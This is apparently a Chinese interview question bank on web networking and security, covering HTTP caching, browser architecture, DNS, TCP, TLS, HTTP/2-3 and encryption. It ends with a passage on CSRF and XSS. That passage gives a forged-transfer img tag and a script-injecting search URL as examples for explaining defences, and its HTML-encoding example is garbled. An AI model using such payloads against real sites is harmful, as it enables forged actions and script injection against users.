# 网络与安全

## 1、说一下 Http 缓存策略，有什么区别，分别解决了什么问题？

HTTP 缓存策略主要分为强缓存和协商缓存两种：

**强缓存**
- 使用 `Cache-Control` 和 `Expires` 头部
- 不需要向服务器发送请求，直接从缓存读取
- 解决问题：减少网络请求，提升页面加载速度，降低服务器压力

**Cache-Control:**
- `max-age=xxx`：缓存有效期（秒）
- `no-cache`：不使用强缓存，使用协商缓存
- `no-store`：禁止缓存
- `public`：可以被浏览器和 CDN 缓存
- `private`：只能被浏览器缓存

**协商缓存**
- 使用 `ETag` / `If-None-Match` 或 `Last-Modified` / `If-Modified-Since`
- 向服务器发送请求，询问资源是否修改
- 如果未修改，返回 304 状态码，使用缓存
- 解决问题：确保获取最新资源，同时减少数据传输

**区别：**
1. 强缓存不发送请求，协商缓存发送请求
2. 强缓存优先级高于协商缓存
3. 协商缓存更保证数据新鲜度，强缓存性能更好

---

## 2、chrome 浏览器一共有多少个线程和多少个进程，分别做什么用？渲染进程中都有什么线程？

**进程架构：**
1. **浏览器主进程**（1个）
   - 负责浏览器界面显示、用户交互
   - 管理、创建、销毁其他进程
   - 提供存储功能

2. **GPU 进程**（1个）
   - 负责 3D 绘制、CSS3D、网页合成
   - 统一处理 GPU 任务

3. **网络进程**（1个）
   - 负责网络资源加载
   - 处理 HTTP/HTTPS 请求

4. **渲染进程**（多个，每个标签页一个）
   - 负责页面渲染、脚本执行
   - 多进程隔离，提高稳定性

5. **插件进程**（多个，每个插件一个）
   - 插件独立进程，插件崩溃不影响浏览器

**渲染进程中的线程：**
1. **GUI 渲染线程**
   - 负责渲染页面
   - 解析 HTML、CSS，构建 DOM/CSSOM
   - 执行重排重绘
   - 与 JS 线程互斥

2. **JS 引擎线程**
   - 负责 JavaScript 代码执行
   - V8 引擎
   - 单线程，通过事件循环实现异步

3. **事件触发线程**
   - 负责事件管理（鼠标点击、键盘事件）
   - 将事件添加到事件队列

4. **定时器线程**
   - 负责 `setTimeout`、`setInterval`
   - 计时结束后回调放入事件队列

5. **异步 HTTP 请求线程**
   - 负责 XMLHttpRequest 等异步请求
   - 请求完成后回调放入事件队列

---

## 3、说说浏览器渲染流程，分层之后在什么时候合成？什么是重排和重绘？如何避免？

**浏览器渲染流程：**
1. 解析 HTML，构建 DOM 树
2. 解析 CSS，构建 CSSOM 树
3. 合并 DOM 和 CSSOM，生成渲染树
4. 布局：计算每个节点的位置和大小
5. 分层：根据 z-index、transform、opacity 等属性创建图层
6. 绘制：填充图层的像素
7. 合成：将图层合成为完整页面

**合成时机：**
- 在绘制完成后，由合成线程负责
- 利用 GPU 加速，将多个图层合成最终图像
- 合成操作在独立的合成线程中完成，不阻塞主线程

**重排：**
- 元素位置、大小改变，需要重新计算布局
- 触发操作：改变 width/height、添加/删除元素、改变字体等
- 消耗较大，要尽量避免

**重绘：**
- 元素外观改变但位置不变
- 触发操作：改变 color、background、box-shadow 等
- 消耗比重排小

**如何避免：**
1. 避免频繁操作样式，使用 class 批量修改
2. 使用 `transform` 和 `opacity` 代替位置、大小变化（不会触发重排）
3. 使用 `document.createDocumentFragment()` 批量添加节点
4. 使用 `requestAnimationFrame` 优化动画
5. 使用 `will-change` 属性提示浏览器优化
6. 避免使用 `table` 布局
7. 避免逐条修改样式，一次性设置

---

## 4、CDN 是什么？描述下 CDN 原理？为什么要 CDN？

**CDN（Content Delivery Network，内容分发网络）：**
- 分布式网络系统，将内容缓存到全球各地边缘节点
- 用户访问时从最近的节点获取内容

**CDN 原理：**
1. 用户请求域名
2. DNS 解析返回 CDN 节点 IP（智能 DNS）
3. 请求到达 CDN 边缘节点
4. 节点检查缓存：
   - 命中：直接返回
   - 未命中：回源站获取，缓存后返回
5. 用户获取内容

**为什么要 CDN：**
1. **加速访问**：就近访问，减少延迟
2. **降低源站压力**：分散流量到边缘节点
3. **提高可用性**：节点故障自动切换
4. **节省带宽成本**：减少源站带宽消耗
5. **提升安全性**：提供 DDoS 防护
6. **全球覆盖**：解决跨地域访问慢问题

---

## 5、CDN 有哪些优化静态资源加载速度的机制？

**CDN 优化机制：**

1. **边缘缓存**
   - 在全球边缘节点缓存静态资源
   - 用户就近获取，减少传输距离

2. **智能 DNS 解析**
   - 根据用户 IP 返回最优节点
   - 考虑网络状况、节点负载

3. **预连接**
   - 提前建立 TCP 连接
   - 减少 TCP 握手时间

4. **持久连接**
   - 复用 TCP 连接
   - 避免重复建立连接

5. **Gzip/Brotli 压缩**
   - 减小传输体积
   - 节省带宽，提升速度

6. **HTTP/2 或 HTTP/3**
   - 多路复用，减少请求延迟
   - 服务器推送（HTTP/2）

7. **断点续传**
   - 支持 Range 请求
   - 大文件下载中断可续传

8. **动态加速**
   - 优化动态内容传输
   - 协议优化、路由优化

9. **缓存预热**
   - 提前将热点资源推送到节点
   - 避免用户访问时回源

10. **自动回源**
    - 节点失效自动切换到其他节点
    - 提高可用性

---

## 6、说一下浏览器解析 Html 文件的过程。

**HTML 解析过程：**

1. **字节流 → 字符流**
   - 网络接收字节流
   - 按编码转换为字符流

2. **词法分析（Tokenization）**
   - 将字符流转换为 Token（标签、属性、文本等）
   - 识别 HTML 标签和属性

3. **语法分析（Parsing）**
   - 将 Token 转换为 DOM 节点
   - 构建 DOM 树
   - 遇到 `<script>` 会暂停解析，等待脚本执行

4. **DOM 树构建**
   - HTML 标签 → 元素节点
   - 文本 → 文本节点
   - 注释 → 注释节点

5. **遇到 CSS 资源**
   - 下载 CSS 文件（异步，不阻塞 HTML 解析）
   - 解析完成后构建 CSSOM 树

6. **遇到 JavaScript**
   - `<script src="...">`：下载并执行，阻塞 HTML 解析
   - `<script defer>`：延迟到 HTML 解析完执行
   - `<script async>`：异步下载，下载完后执行

7. **构建渲染树**
   - 合并 DOM 树和 CSSOM 树
   - 排除 `display: none` 的元素

8. **布局和绘制**
   - 计算节点位置
   - 绘制页面

**注意：**
- HTML 解析是流式的，边下载边解析
- `<script>` 默认会阻塞解析，建议使用 `defer` 或 `async`
- CSS 虽然不阻塞 HTML 解析，但会阻塞 JS 执行和渲染

---

## 7、从输入 Url 到页面加载的全过程。

**完整流程：**

1. **URL 解析**
   - 检查 URL 格式
   - 解析协议、域名、端口、路径等

2. **DNS 解析**
   - 浏览器缓存 → 操作系统缓存 → Hosts 文件 → 本地 DNS 服务器 → 根域名服务器 → 顶级域名服务器 → 权威域名服务器
   - 获取域名对应的 IP 地址

3. **TCP 连接（三次握手）**
   - 客户端发送 SYN
   - 服务端回复 SYN+ACK
   - 客户端回复 ACK
   - 建立 TCP 连接

4. **HTTPS 握手（如果是 HTTPS）**
   - TLS/SSL 握手
   - 交换密钥，验证证书
   - 建立加密通道

5. **发送 HTTP 请求**
   - 构造请求行、请求头、请求体
   - 发送到服务器

6. **服务器处理请求**
   - 路由匹配
   - 业务逻辑处理
   - 查询数据库等

7. **服务器返回响应**
   - 返回响应行、响应头、响应体
   - 状态码（200、404、500 等）

8. **浏览器解析响应**
   - 解析 HTML，构建 DOM 树
   - 解析 CSS，构建 CSSOM 树
   - 合并构建渲染树

9. **布局**
   - 计算节点位置和大小
   - 生成布局树

10. **绘制**
    - 绘制图层
    - 合成页面

11. **断开连接（四次挥手）**
    - 客户端发送 FIN
    - 服务端回复 ACK
    - 服务端发送 FIN
    - 客户端回复 ACK

---

## 8、说说 DNS 解析的具体过程。

**DNS 解析步骤：**

1. **浏览器缓存检查**
   - 检查浏览器是否有缓存的 DNS 记录
   - 如果有且未过期，直接返回

2. **操作系统缓存检查**
   - 检查 `/etc/hosts` 文件（Linux/Mac）
   - 检查 `C:\Windows\System32\drivers\etc\hosts`（Windows）
   - 检查系统 DNS 缓存

3. **本地 DNS 服务器（递归查询）**
   - 向本地 DNS 服务器（通常是 ISP 提供的）发起查询
   - 本地 DNS 服务器负责递归查询

4. **根域名服务器迭代查询**
   - 本地 DNS 查询根域名服务器（.）
   - 根服务器返回顶级域名服务器地址（如 .com、.cn）

5. **顶级域名服务器查询**
   - 本地 DNS 查询顶级域名服务器
   - 返回权威域名服务器地址（如 example.com）

6. **权威域名服务器查询**
   - 本地 DNS 查询权威域名服务器
   - 返回最终的 IP 地址

7. **返回结果**
   - 本地 DNS 将 IP 地址返回给浏览器
   - 浏览器和本地 DNS 都会缓存结果

**记录类型：**
- **A 记录**：域名 → IPv4 地址
- **AAAA 记录**：域名 → IPv6 地址
- **CNAME 记录**：域名别名
- **MX 记录**：邮件服务器
- **NS 记录**：域名服务器

**DNS 缓存时间（TTL）：**
- 默认 300 秒到 86400 秒不等
- 可以通过修改 DNS 记录的 TTL 值控制缓存时间

---

## 9、常见的 Http 请求头有哪些？以及它的作用。

**常见 HTTP 请求头：**

**1. 请求相关：**
- `Host`：目标主机名（必填）
- `User-Agent`：浏览器类型、版本
- `Accept`：客户端接受的内容类型（如 `text/html,application/json`）
- `Accept-Language`：接受的语言
- `Accept-Encoding`：接受的压缩方式（如 `gzip, deflate, br`）

**2. 缓存相关：**
- `If-None-Match`：与 ETag 配合，判断资源是否修改
- `If-Modified-Since`：与 Last-Modified 配合
- `Cache-Control`：缓存策略

**3. 连接相关：**
- `Connection`：连接管理（如 `keep-alive`）
- `Upgrade`：协议升级（如 WebSocket）

**4. 内容相关：**
- `Content-Type`：请求体内容类型（如 `application/json`）
- `Content-Length`：请求体长度
- `Content-Encoding`：请求体压缩方式

**5. 认证相关：**
- `Authorization`：认证信息（如 `Bearer token`）
- `Cookie`：携带 Cookie

**6. 来源相关：**
- `Referer`：来源页面
- `Origin`：源信息（用于 CORS）
- `User-Agent`：浏览器标识

**7. 条件请求：**
- `If-Match`：匹配 ETag
- `If-Range`：范围请求条件

**8. 特殊请求：**
- `X-Requested-With`：标识 AJAX 请求
- `X-CSRF-Token`：CSRF 令牌
- `X-Forwarded-For`：真实 IP（代理）

**9. 范围请求：**
- `Range`：请求部分资源（如 `bytes=0-1023`）

**10. 实时更新：**
- `Upgrade-Insecure-Requests`：请求升级为 HTTPS

---

## 10、encoding 头都有哪些编码方式？

**Content-Encoding 头的编码方式：**

1. **gzip**
   - 最常用的压缩格式
   - 压缩率约 60-70%
   - 广泛支持

2. **deflate**
   - 基于 zlib 算法
   - 压缩率略低于 gzip
   - 支持度不如 gzip

3. **br（Brotli）**
   - Google 开发的新压缩算法
   - 压缩率比 gzip 高 15-25%
   - 现代浏览器支持

4. **compress**
   - Unix compress 命令
   - 已过时，很少使用

5. **identity**
   - 不压缩
   - 默认值

**Accept-Encoding 示例：**
```
Accept-Encoding: gzip, deflate, br
```

**响应头示例：**
```
Content-Encoding: gzip
Content-Length: 1234
```

**使用建议：**
- 优先使用 Brotli（br），兼容性好时压缩效果最佳
- 备选 gzip，兼容性最好
- 不推荐 deflate 和 compress

---

## 11、UTF-8 和 asc 码有什么区别？

**ASCII（American Standard Code for Information Interchange）：**
- 7 位编码，共 128 个字符
- 只包含英文字母、数字、标点符号、控制字符
- 单字节，每个字符占用 1 个字节
- 适合英文环境

**UTF-8（8-bit Unicode Transformation Format）：**
- Unicode 的可变长度编码
- 1-4 个字节表示一个字符
- 兼容 ASCII（ASCII 字符用 1 个字节）
- 支持全球所有语言字符
- 占用空间更大，但通用性强

**区别：**

| 特性 | ASCII | UTF-8 |
|------|-------|-------|
| 字符集 | 128 个字符 | 所有 Unicode 字符 |
| 编码长度 | 固定 1 字节 | 1-4 字节 |
| 兼容性 | - | 兼容 ASCII |
| 语言支持 | 仅英文 | 全世界语言 |
| 存储空间 | 英文相同 | 非英文字符更大 |
| 用途 | 简单文本 | 通用文本 |

**存储对比：**
- "Hello" - ASCII: 5 字节，UTF-8: 5 字节
- "你好" - ASCII: 不支持，UTF-8: 6 字节
- "😊" - ASCII: 不支持，UTF-8: 4 字节

**使用建议：**
- 新项目统一使用 UTF-8
- 可以处理多语言内容
- 避免乱码问题

---

## 12、TCP 和 UDP 有什么区别？TCP 怎样确保数据正确性？TCP 头包含什么？TCP 属于哪一层？

**TCP vs UDP 区别：**

| 特性 | TCP | UDP |
|------|-----|-----|
| 连接性 | 面向连接 | 无连接 |
| 可靠性 | 可靠传输 | 不保证可靠 |
| 顺序 | 保证顺序 | 不保证顺序 |
| 速度 | 较慢 | 较快 |
| 流量控制 | 有 | 无 |
| 拥塞控制 | 有 | 无 |
| 头部大小 | 20-60 字节 | 8 字节 |
| 传输方式 | 字节流 | 数据报 |
| 应用场景 | 文件传输、邮件、网页 | 视频直播、语音通话、DNS |

**TCP 确保数据正确性的机制：**

1. **序列号和确认应答**
   - 每个数据包有序列号
   - 接收方收到后发送 ACK
   - 未收到 ACK 则重传

2. **超时重传**
   - 发送方设置超时时间
   - 超时未收到 ACK 则重传
   - 动态调整超时时间

3. **校验和**
   - 头部和数据都有校验和
   - 检测数据损坏

4. **流量控制（滑动窗口）**
   - 接收方通过窗口大小告知发送方发送能力
   - 避免接收方缓冲区溢出

5. **拥塞控制**
   - 慢启动
   - 拥塞避免
   - 快重传和快恢复
   - 避免网络拥塞

**TCP 头包含：**
- 源端口（16 bit）
- 目标端口（16 bit）
- 序列号（32 bit）
- 确认号（32 bit）
- 头部长度（4 bit）
- 保留（6 bit）
- 标志位：URG、ACK、PSH、RST、SYN、FIN（6 bit）
- 窗口大小（16 bit）
- 校验和（16 bit）
- 紧急指针（16 bit）
- 选项（可选，最长 40 字节）

**TCP 属于哪一层：**
- **传输层**（Transport Layer）
- OSI 七层模型第 4 层
- TCP/IP 四层模型第 3 层

---

## 13、请你写出 HTTP 协议三次握手，四次挥手过程。最后介绍一下网络的五层模型。

**三次握手（建立连接）：**

1. **第一次握手（SYN）**
   - 客户端发送 `SYN=1, seq=x`
   - 客户端进入 `SYN_SENT` 状态
   - 询问服务端是否可以建立连接

2. **第二次握手（SYN+ACK）**
   - 服务端收到 SYN，回复 `SYN=1, ACK=1, ack=x+1, seq=y`
   - 服务端进入 `SYN_RCVD` 状态
   - 确认可以建立连接，并询问客户端

3. **第三次握手（ACK）**
   - 客户端收到 SYN+ACK，回复 `ACK=1, ack=y+1, seq=x+1`
   - 客户端进入 `ESTABLISHED` 状态
   - 确认可以建立连接
   - 服务端收到后也进入 `ESTABLISHED` 状态

**为什么要三次握手：**
- 防止已失效的连接请求报文段突然又传到服务端
- 确认双方的接收和发送能力都正常

**四次挥手（断开连接）：**

1. **第一次挥手（FIN）**
   - 客户端发送 `FIN=1, seq=u`
   - 客户端进入 `FIN_WAIT_1` 状态
   - 表示客户端无数据发送了

2. **第二次挥手（ACK）**
   - 服务端收到 FIN，回复 `ACK=1, ack=u+1, seq=v`
   - 服务端进入 `CLOSE_WAIT` 状态
   - 客户端收到后进入 `FIN_WAIT_2` 状态
   - 表示服务端知道了客户端要关闭

3. **第三次挥手（FIN）**
   - 服务端数据发送完毕，发送 `FIN=1, ACK=1, ack=u+1, seq=w`
   - 服务端进入 `LAST_ACK` 状态
   - 表示服务端也要关闭了

4. **第四次挥手（ACK）**
   - 客户端收到 FIN，回复 `ACK=1, ack=w+1, seq=u+1`
   - 客户端进入 `TIME_WAIT` 状态
   - 等待 2MSL 后进入 `CLOSED` 状态
   - 服务端收到后进入 `CLOSED` 状态

**为什么要四次挥手：**
- TCP 是全双工的，需要双方都确认关闭
- 服务端收到 FIN 后可能还有数据要发送，所以先 ACK 再 FIN

**TIME_WAIT 作用：**
- 确保最后的 ACK 能到达服务端
- 等待足够时间让旧报文自然消失

**网络五层模型（TCP/IP 模型）：**

1. **应用层**
   - 协议：HTTP、HTTPS、FTP、SMTP、DNS
   - 功能：为应用程序提供网络服务
   - 数据单位：报文

2. **传输层**
   - 协议：TCP、UDP
   - 功能：提供端到端的通信服务
   - 数据单位：报文段/用户数据报

3. **网络层**
   - 协议：IP、ICMP、ARP、RARP
   - 功能：路由选择，实现主机间通信
   - 数据单位：数据包/分组

4. **数据链路层**
   - 协议：以太网、WiFi、PPP
   - 功能：将数据包封装成帧，介质访问控制
   - 数据单位：帧

5. **物理层**
   - 设备：网线、光纤、网卡
   - 功能：传输比特流
   - 数据单位：比特

---

## 14、传输层和网络层分别负责什么，端口在什么层标记？

**传输层（Transport Layer）：**
- **功能：**
  - 提供端到端的通信服务
  - 实现进程间通信
  - 流量控制
  - 拥塞控制
  - 差错控制

- **协议：**
  - TCP：面向连接、可靠传输
  - UDP：无连接、不可靠传输

- **数据单位：**
  - 报文段（TCP）
  - 用户数据报（UDP）

- **作用：**
  - 区分不同的应用程序
  - 保证数据顺序和完整性（TCP）

**网络层（Network Layer）：**
- **功能：**
  - 路由选择和转发
  - 实现主机间通信
  - 地址管理（IP 地址）
  - 分组和重组

- **协议：**
  - IP：网际协议
  - ICMP：互联网控制报文协议
  - ARP：地址解析协议
  - RARP：反向地址解析协议

- **数据单位：**
  - 数据包（Packet）

- **作用：**
  - 将数据包从源主机传输到目的主机
  - 决定最佳路径（路由）

**端口（Port）：**
- **所在层：** 传输层
- **作用：** 标识不同的应用程序或进程
- **范围：** 0-65535
  - 0-1023：熟知端口（Well-known Ports）
  - 1024-49151：注册端口（Registered Ports）
  - 49152-65535：动态端口（Dynamic Ports）

**常见端口：**
- 80：HTTP
- 443：HTTPS
- 22：SSH
- 21：FTP
- 25：SMTP
- 53：DNS
- 3306：MySQL
- 27017：MongoDB
- 3000：Node.js 默认端口
- 8080：备用 HTTP 端口

**区分：**
- IP 地址：标记网络中的主机（网络层）
- MAC 地址：标记网络接口卡（数据链路层）
- 端口：标记主机上的应用程序（传输层）

---

## 15、介绍一下 HTTPS 和 HTTP 的区别是什么？https 为什么比 HTTP 安全？如何配置？

**HTTP vs HTTPS 区别：**

| 特性 | HTTP | HTTPS |
|------|------|-------|
| 协议 | HTTP | HTTP + SSL/TLS |
| 端口 | 80 | 443 |
| 安全性 | 明文传输，不安全 | 加密传输，安全 |
| 性能 | 稍快 | 稍慢（握手耗时） |
| 证书 | 不需要 | 需要 SSL 证书 |
| 成本 | 免费 | 证书需付费（有免费选项） |
| SEO | 排名较低 | 排名更高 |

**HTTPS 比 HTTP 安全的原因：**

1. **数据加密**
   - 所有数据加密传输
   - 防止数据被窃听

2. **身份验证**
   - 通过 SSL 证书验证服务器身份
   - 防止中间人攻击

3. **数据完整性**
   - 消息认证码（MAC）确保数据未被篡改
   - 防止数据被修改

4. **防止钓鱼**
   - HTTPS + 证书 = 可信网站
   - 浏览器显示锁图标

**HTTPS 配置步骤：**

**1. 获取 SSL 证书**
- 免费：Let's Encrypt（推荐）
- 付费：DigiCert、Symantec 等

**2. 安装证书**
- 使用 Certbot（Let's Encrypt）
```bash
# 安装 Certbot
sudo apt-get install certbot python3-certbot-nginx

# 获取证书
sudo certbot --nginx -d yourdomain.com -d www.yourdomain.com
```

**3. Nginx 配置示例**
```nginx
server {
    listen 443 ssl http2;
    server_name yourdomain.com;

    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # 其他配置...
}

# HTTP 重定向到 HTTPS
server {
    listen 80;
    server_name yourdomain.com;
    return 301 https://$server_name$request_uri;
}
```

**4. 自动续期**
```bash
# 测试续期
sudo certbot renew --dry-run

# Certbot 自动续期（已配置）
```

**Node.js 配置示例：**
```javascript
const https = require('https');
const fs = require('fs');
const express = require('express');

const app = express();

const options = {
  key: fs.readFileSync('/path/to/private-key.pem'),
  cert: fs.readFileSync('/path/to/certificate.pem'),
  ca: fs.readFileSync('/path/to/ca-bundle.pem')
};

https.createServer(options, app).listen(443);

// HTTP 重定向
const httpApp = express();
httpApp.use((req, res) => {
  res.redirect(`https://${req.headers.host}${req.url}`);
});
httpApp.listen(80);
```

**5. 混合内容修复**
- 确保所有资源都使用 HTTPS
- 检查并替换 HTTP 链接

---

## 16、HTTP1、HTTP2、HTTP3 分别有什么最大的区别？http2 怎么确保文件同时传输不会报错？

**HTTP/1.x vs HTTP/2 vs HTTP/3：**

**HTTP/1.0 / HTTP/1.1：**
- **HTTP/1.0**：每次请求都需要建立新连接
- **HTTP/1.1**：
  - 持久连接
  - 管道化
  - 仍然存在队头阻塞

**HTTP/1.x 问题：**
- 队头阻塞
- 请求/响应头不压缩
- 只能串行发送请求

**HTTP/2：**
- **二进制协议**：不再是文本协议
- **多路复用**：同一连接可并发多个请求，解决队头阻塞
- **头部压缩**：使用 HPACK 算法压缩头部
- **服务器推送**：服务器可主动推送资源
- **请求优先级**：设置请求优先级
- **流量控制**：精细化流量控制

**HTTP/3：**
- 基于 QUIC 协议（UDP）
- 解决 TCP 层的队头阻塞
- 连接迁移（网络切换不中断）
- 更快的握手（0-RTT）
- 改进的拥塞控制

**最大区别总结：**

| 特性 | HTTP/1.1 | HTTP/2 | HTTP/3 |
|------|----------|--------|--------|
| 传输层 | TCP | TCP | UDP (QUIC) |
| 并发 | 串行 | 多路复用 | 多路复用 |
| 队头阻塞 | 存在 | 应用层解决 | 传输层解决 |
| 头部压缩 | 无 | HPACK | QPACK |
| 服务器推送 | 无 | 支持 | 支持 |
| 二进制协议 | 文本 | 二进制 | 二进制 |
| 连接迁移 | 不支持 | 不支持 | 支持 |
| 握手时间 | 1-RTT | 1-RTT | 0-RTT |

**HTTP/2 如何确保文件同时传输不会报错：**

1. **流标识（Stream ID）**
   - 每个请求/响应对分配一个唯一的流 ID
   - 奇数 ID：客户端发起
   - 偶数 ID：服务端发起

2. **帧（Frame）机制**
   - 消息被分割成多个帧
   - 每个帧包含流 ID
   - 不同流的帧可以交错传输

3. **帧类型**
   - HEADERS：头部帧
   - DATA：数据帧
   - SETTINGS：设置帧
   - PRIORITY：优先级帧
   - RST_STREAM：重置流
   - PING：心跳帧
   - WINDOW_UPDATE：流量控制帧

4. **流状态机**
   - 每个流有独立的状态
   - IDLE → OPEN → HALF-CLOSED → CLOSED
   - 可以独立控制流的关闭

5. **优先级和依赖**
   - 可以设置流的优先级
   - 流可以依赖于其他流
   - 确保重要资源优先传输

6. **流量控制**
   - 每个流独立控制窗口大小
   - 防止发送方淹没接收方
   - WINDOW_UPDATE 帧更新窗口

7. **错误处理**
   - 错误不会影响整个连接
   - 使用 RST_STREAM 帧重置单个流
   - 连接错误才关闭连接

8. **头部压缩（HPACK）**
   - 静态表：常用头部
   - 动态表：自定义头部
   - 避免重复传输相同的头部

**工作流程示例：**
```
客户端发起请求1（Stream ID 1）→ HEADERS 帧
客户端发起请求2（Stream ID 3）→ HEADERS 帧
服务端响应2（Stream ID 3）→ HEADERS 帧 → DATA 帧
服务端响应1（Stream ID 1）→ HEADERS 帧 → DATA 帧
```

这样，多个请求可以并发传输，互不影响。

---

## 17、对称加密和非对称加密的区别和用处是什么？

**对称加密：**
- **特点：**
  - 加密和解密使用相同的密钥
  - 加密解密速度快
  - 密钥分发困难
  - 密钥管理复杂（N个用户需要 N*(N-1)/2 个密钥）

- **常用算法：**
  - AES（Advanced Encryption Standard）
  - DES（Data Encryption Standard，已不安全）
  - 3DES
  - RC4（已不安全）

- **使用场景：**
  - 大量数据加密（如文件、数据库）
  - 传输大量数据时
  - 性能要求高的场景

- **优点：**
  - 加密解密速度快
  - 算法相对简单
  - 适合大数据量

- **缺点：**
  - 密钥分发困难
  - 密钥管理复杂
  - 无法实现数字签名

**非对称加密：**
- **特点：**
  - 加密和解密使用不同的密钥（公钥和私钥）
  - 公钥加密只能用私钥解密
  - 私钥加密（签名）只能用公钥验证
  - 速度较慢
  - 密钥管理简单（N个用户只需2N个密钥）

- **常用算法：**
  - RSA
  - ECC（Elliptic Curve Cryptography）
  - DSA
  - ElGamal

- **使用场景：**
  - 数字签名
  - 密钥交换
  - 身份认证
  - 小数据量加密

- **优点：**
  - 密钥分发安全
  - 可以实现数字签名
  - 密钥管理简单
  - 支持身份认证

- **缺点：**
  - 加密解密速度慢
  - 不适合大数据量
  - 算法复杂

**区别总结：**

| 特性 | 对称加密 | 非对称加密 |
|------|----------|------------|
| 密钥 | 加密解密同一密钥 | 公钥和私钥 |
| 速度 | 快 | 慢 |
| 安全性 | 依赖密钥保护 | 依赖数学难题 |
| 密钥管理 | 复杂 | 简单 |
| 数字签名 | 不支持 | 支持 |
| 应用场景 | 数据加密 | 密钥交换、签名 |

**实际应用 - HTTPS：**
1. 使用非对称加密进行密钥交换
2. 使用交换的对称密钥进行数据传输
3. 结合两者的优点

---

## 18、说一下加密握手的过程？

**TLS/SSL 握手过程（以 RSA 为例）：**

**1. Client Hello**
```
客户端 → 服务端：
- 支持的 TLS 版本（如 TLS 1.2、1.3）
- 支持的加密套件（如 TLS_RSA_WITH_AES_128_GCM_SHA256）
- 随机数（Client Random）
- 支持的压缩方法
```

**2. Server Hello**
```
服务端 → 客户端：
- 选择的 TLS 版本
- 选择的加密套件
- 随机数（Server Random）
- 选择压缩方法（或不压缩）
```

**3. Certificate**
```
服务端 → 客户端：
- 服务器的数字证书（包含公钥）
- 证书链
```

**4. Server Key Exchange（可选）**
```
服务端 → 客户端：
- 如果使用 Diffie-Hellman，发送 DH 参数
```

**5. Server Hello Done**
```
服务端 → 客户端：
- 握手消息结束
```

**6. Client Key Exchange**
```
客户端 → 服务端：
- 生成预主密钥（Pre-Master Secret）
- 使用服务器的公钥加密预主密钥
- 发送加密后的预主密钥
```

**7. Certificate Verify（可选）**
```
客户端 → 服务端：
- 如果需要客户端证书，发送客户端证书
- 证明客户端身份
```

**8. Change Cipher Spec**
```
双向：
- 通知对方后续消息将使用协商好的密钥加密
```

**9. Finished**
```
双向：
- 验证握手过程是否完整
- 使用协商好的密钥加密
```

**10. 数据传输**
```
- 使用会话密钥加密数据
- 会话密钥 = PRF(预主密钥 + Client Random + Server Random)
```

**TLS 1.3 握手过程（简化）：**

**1. Client Hello**
```
客户端 → 服务端：
- 支持的加密套件
- 密钥共享参数（支持 0-RTT）
```

**2. Server Hello**
```
服务端 → 客户端：
- 选择的加密套件
- 服务器的密钥共享参数
- 证书（可能一起发送）
```

**3. (Encrypted Extensions) Finished**
```
服务端 → 客户端：
- 加密的扩展信息
- Finished 消息
```

**4. Finished**
```
客户端 → 服务端：
- Finished 消息
```

**TLS 1.3 优势：**
- 握手时间减少（1-RTT）
- 支持 0-RTT（连接复用时）
- 移除了不安全的加密算法
- 更好的前向安全性

---

## 19、介绍一下 SSL 与 TLS。

**SSL（Secure Sockets Layer）：**
- **全称：** Secure Sockets Layer
- **开发者：** Netscape 公司
- **版本历史：**
  - SSL 1.0：未公开发布
  - SSL 2.0：1995年发布，有严重安全漏洞
  - SSL 3.0：1996年发布，2014年被发现 POODLE 漏洞，现已弃用

- **问题：**
  - 存在安全漏洞
  - 设计不够完善
  - 已被 TLS 取代

**TLS（Transport Layer Security）：**
- **全称：** Transport Layer Security
- **开发者：** IETF（互联网工程任务组）
- **版本历史：**
  - TLS 1.0：1999年发布，基于 SSL 3.0
  - TLS 1.1：2006年发布，修复了一些漏洞
  - TLS 1.2：2008年发布，支持更强的加密算法
  - TLS 1.3：2018年发布，重大改进，更快更安全

**TLS 1.3 特点：**
- 移除了不安全的加密算法
- 握手时间减少（1-RTT）
- 支持 0-RTT
- 强制前向安全性
- 更好的密钥派生函数

**区别：**

| 特性 | SSL | TLS |
|------|-----|-----|
| 开发者 | Netscape | IETF |
| 当前状态 | 已弃用 | 活跃 |
| 安全性 | 较差 | 更强 |
| 版本 | 1.0-3.0 | 1.0-1.3 |
| 兼容性 | 旧系统 | 新系统 |

**关系：**
- TLS 是 SSL 的继任者
- TLS 1.0 基于 SSL 3.0
- 通常说的 SSL 实际上是指 TLS
- 很多工具和库仍使用 SSL 名称（如 OpenSSL）

**使用建议：**
- 新项目使用 TLS 1.2 或 1.3
- 禁用 SSL 和 TLS 1.0、1.1
- 优先使用 TLS 1.3

**配置示例：**
```nginx
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384;
```

---

## 20、请描述一下 CSRF 与 XSS 的基本概念、攻击原理和防御措施。

**CSRF（Cross-Site Request Forgery，跨站请求伪造）：**

**基本概念：**
- 攻击者诱导用户在已认证的网站上执行非本意的操作
- 利用用户的登录状态

**攻击原理：**
1. 用户登录了受信任网站 A（Cookie 保存在浏览器）
2. 用户访问恶意网站 B
3. 网站 B 的页面包含对网站 A 的请求（如 `<img src="https://a.com/transfer?to=attacker&amount=1000">`）
4. 浏览器自动携带网站 A 的 Cookie
5. 网站 A 认为是用户自愿发起的请求
6. 请求执行成功

**防御措施：**
1. **CSRF Token**
   - 服务器生成随机 token
   - 放在表单或请求头中
   - 验证 token 是否正确

2. **SameSite Cookie**
   ```
   Set-Cookie: sessionid=xxx; SameSite=Strict
   ```
   - Strict：完全不发送跨站 Cookie
   - Lax：部分场景发送（默认）

3. **验证 Referer**
   - 检查请求来源
   - 确保来源可信

4. **双重 Cookie**
   - 在 Cookie 和参数中都设置 token
   - 两者比对验证

**XSS（Cross-Site Scripting，跨站脚本攻击）：**

**基本概念：**
- 攻击者在网页中注入恶意脚本
- 脚本在用户浏览器中执行

**XSS 分类：**

1. **存储型 XSS**
   - 恶意脚本存储在服务器（数据库）
   - 访问页面时执行
   - 危害最大

2. **反射型 XSS**
   - 恶意脚本通过 URL 参数传递
   - 服务器反射回浏览器
   - 需要用户点击链接

3. **DOM 型 XSS**
   - 恶意脚本通过 DOM 修改执行
   - 不经过服务器
   - 纯客户端漏洞

**攻击原理：**
```
正常链接：https://example.com/search?q=hello
恶意链接：https://example.com/search?q=<script>alert('XSS')</script>
```
页面直接渲染参数，脚本执行。

**防御措施：**

1. **输入验证**
   - 过滤特殊字符（< > " ' &）
   - 白名单验证

2. **输出编码**
   - HTML 编码：`<` → `<`
   - URL 编码
   - JS 编码

